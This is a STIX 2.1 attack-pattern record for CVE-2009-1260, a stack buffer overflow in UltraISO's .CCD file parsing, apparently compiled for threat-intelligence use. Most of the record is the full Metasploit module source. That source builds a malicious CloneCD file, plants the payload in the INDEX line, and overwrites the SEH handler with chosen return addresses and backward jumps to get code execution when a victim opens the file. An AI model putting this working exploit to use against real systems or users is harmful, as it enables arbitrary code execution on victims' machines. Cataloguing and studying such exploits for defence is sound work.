{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--411621b6-c005-4b9c-ac6d-05a7ad72f0be",
    "created": "2024-08-14T16:35:58.197489Z",
    "modified": "2024-08-14T16:35:58.197493Z",
    "name": "UltraISO CCD File Parsing Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in EZB Systems, Inc's UltraISO. When processing .CCD files, data is read from file into a fixed-size stack buffer. Since no bounds checking is done, a buffer overflow can occur. Attackers can execute arbitrary code by convincing their victim to open an CCD file.  NOTE: A file with the same base name, but the extension of \"img\" must also exist. Opening either file will trigger the vulnerability, but the files must both exist.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ultraiso_ccd.rb",
            "external_id": "ultraiso_ccd.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1260"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'UltraISO CCD File Parsing Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in EZB Systems, Inc's\n        UltraISO. When processing .CCD files, data is read from file into a\n        fixed-size stack buffer. Since no bounds checking is done, a buffer overflow\n        can occur. Attackers can execute arbitrary code by convincing their victim\n        to open an CCD file.\n\n        NOTE: A file with the same base name, but the extension of \"img\" must also\n        exist. Opening either file will trigger the vulnerability, but the files must\n        both exist.\n      },\n      'License'        => MSF_LICENSE,\n      'Author' \t     => [ 'jduck' ],\n      'References'     =>\n        [\n          [ 'CVE', '2009-1260' ],\n          [ 'OSVDB', '53275' ],\n          [ 'BID', '34363' ],\n          # NOTE: The following BID is a duplicate of BID 34363\n          [ 'BID', '38613' ],\n          # NOTE: The following OSVDB entry seems invalid, the IMG file doesn't appear to trigger any vulnerability.\n          # [ 'OS-VDB', '53425' ],\n          [ 'EDB', '8343' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'       => 2048,\n          'BadChars'    => \"\\x00\\x08\\x0a\\x0d\\x20\",\n          'DisableNops' => true,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested OK on:\n          # v9.3.3.2685\n          # v9.3.6.2750\n\n          # The EXE base addr contains a bad char (nul). This prevents us from\n          # using the super-elite multi-offset SEH exploitation method.\n\n          [ 'Windows Universal - Double-Click/Command Line Open Method',\n            {\n              'Offset' => 4094,\n              # NOTE: lame_enc.dll isn't loaded when opening via double-click / cmd line.\n              #'Ret' => 0x10011640 # p/p/r in lame_enc.dll\n              # To make matters even worse, we can't use system dlls due to Safe SEH!\n              #'Ret' => 0x71b26b7e # p/p/r in mpr.dll\n              'Ret' => 0x00403856 # p/p/r in unpacked UltraISO.exe (from public exploit)\n            }\n          ],\n          [ 'Windows Universal - File->Open + Toolbar Open Methods',\n            {\n              'Offset' => [ 5066, 5158 ],\n              'Ret' => 0x10011640 # p/p/r in lame_enc.dll\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2009-04-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.ccd']),\n      ])\n  end\n\n  def exploit\n\n    print_status(\"Creating '#{datastore['FILENAME']}' using target '#{target.name}' ...\")\n\n    sploit = \"[CloneCD]\\r\\n\"\n    sploit << \"Version=3\\r\\n\"\n\n    sploit << \"[Disc]\\r\\n\"\n    sploit << \"TocEntries=4\\r\\n\"\n    sploit << \"Sessions=1\\r\\n\"\n    sploit << \"DataTracksScrambled=0\\r\\n\"\n    sploit << \"CDTextLength=0\\r\\n\"\n\n    sploit << \"[Session 1]\\r\\n\"\n    sploit << \"PreGapMode=1\\r\\n\"\n    sploit << \"PreGapSubC=0\\r\\n\"\n    sploit << \"[Entry 0]\\r\\n\"\n    sploit << \"Session=1\\r\\n\"\n    sploit << \"Point=0xa0\\r\\n\"\n    sploit << \"ADR=0x01\\r\\n\"\n    sploit << \"Control=0x04\\r\\n\"\n    sploit << \"TrackNo=0\\r\\n\"\n    sploit << \"AMin=0\\r\\n\"\n    sploit << \"ASec=0\\r\\n\"\n    sploit << \"AFrame=0\\r\\n\"\n    sploit << \"ALBA=-150\\r\\n\"\n    sploit << \"Zero=0\\r\\n\"\n    sploit << \"PMin=1\\r\\n\"\n    sploit << \"PSec=0\\r\\n\"\n    sploit << \"PFrame=0\\r\\n\"\n    sploit << \"PLBA=4350\\r\\n\"\n\n    sploit << \"[Entry 1]\\r\\n\"\n    sploit << \"Session=1\\r\\n\"\n    sploit << \"Point=0xa1\\r\\n\"\n    sploit << \"ADR=0x01\\r\\n\"\n    sploit << \"Control=0x04\\r\\n\"\n    sploit << \"TrackNo=0\\r\\n\"\n    sploit << \"AMin=0\\r\\n\"\n    sploit << \"ASec=0\\r\\n\"\n    sploit << \"AFrame=0\\r\\n\"\n    sploit << \"ALBA=-150\\r\\n\"\n    sploit << \"Zero=0\\r\\n\"\n    sploit << \"PMin=1\\r\\n\"\n    sploit << \"PSec=0\\r\\n\"\n    sploit << \"PFrame=0\\r\\n\"\n    sploit << \"PLBA=4350\\r\\n\"\n\n    sploit << \"[Entry 2]\\r\\n\"\n    sploit << \"Session=1\\r\\n\"\n    sploit << \"Point=0xa2\\r\\n\"\n    sploit << \"ADR=0x01\\r\\n\"\n    sploit << \"Control=0x04\\r\\n\"\n    sploit << \"TrackNo=0\\r\\n\"\n    sploit << \"AMin=0\\r\\n\"\n    sploit << \"ASec=0\\r\\n\"\n    sploit << \"AFrame=0\\r\\n\"\n    sploit << \"ALBA=-150\\r\\n\"\n    sploit << \"Zero=0\\r\\n\"\n    sploit << \"PMin=0\\r\\n\"\n    sploit << \"PSec=2\\r\\n\"\n    sploit << \"PFrame=34\\r\\n\"\n    sploit << \"PLBA=34\\r\\n\"\n\n    sploit << \"[Entry 3]\\r\\n\"\n    sploit << \"Session=1\\r\\n\"\n    sploit << \"Point=0x01\\r\\n\"\n    sploit << \"ADR=0x01\\r\\n\"\n    sploit << \"Control=0x04\\r\\n\"\n    sploit << \"TrackNo=0\\r\\n\"\n    sploit << \"AMin=0\\r\\n\"\n    sploit << \"ASec=0\\r\\n\"\n    sploit << \"AFrame=0\\r\\n\"\n    sploit << \"ALBA=-150\\r\\n\"\n    sploit << \"Zero=0\\r\\n\"\n    sploit << \"PMin=0\\r\\n\"\n    sploit << \"PSec=2\\r\\n\"\n    sploit << \"PFrame=0\\r\\n\"\n    sploit << \"PLBA=0\\r\\n\"\n\n    sploit << \"[TRACK 1]\\r\\n\"\n    sploit << \"MODE=1\\r\\n\"\n    sploit << \"INDEX 1=\"\n\n    idx_line = ''\n    idx_line << rand_text_alphanumeric(1000) * 9\n\n    # Stick the payload at the beginning\n    idx_line[0,payload.encoded.length] = payload.encoded\n\n    # If we have an array of offets, handle it specially\n    seh_offset = target['Offset']\n    if (seh_offset.is_a?(::Array))\n      # Multiple offets that can be used simultaneously\n      seh_offset.each { |off|\n        seh = generate_seh_record(target.ret)\n        distance = off + seh.length\n        jmp = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n\n        idx_line[off, seh.length] = seh\n        idx_line[off+seh.length, jmp.length] = jmp\n      }\n    else\n      off = seh_offset\n      # We'll manually construct this double-backward jumping SEH handler frame\n      distance = off - 5\n      jmp1 = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n      distance = jmp1.length\n      jmp2 = Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-\" + distance.to_s).encode_string\n      seh = ''\n      seh << jmp2\n      seh << rand_text(2)\n      seh << [target.ret].pack('V')\n      # we can't put anything below the return address due to a potential nul byte in it\n\n      # Add the double-back-jumping SEH frame\n      idx_line[off-5, jmp1.length] = jmp1\n      idx_line[off,seh.length] = seh\n    end\n\n    sploit << idx_line\n\n    file_create(sploit)\n\n    # This extends the current class, and changes the file_format_name.\n    # This allows us to use the file_create(data) to store the created\n    # file in the correct directory.\n\n    class << self\n      def file_format_filename\n        datastore['FILENAME'].gsub(/\\.ccd$/, '.img')\n      end\n    end\n\n    file_create('')\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-04-03",
    "x_mitre_platforms": [
        "win'"
    ]
}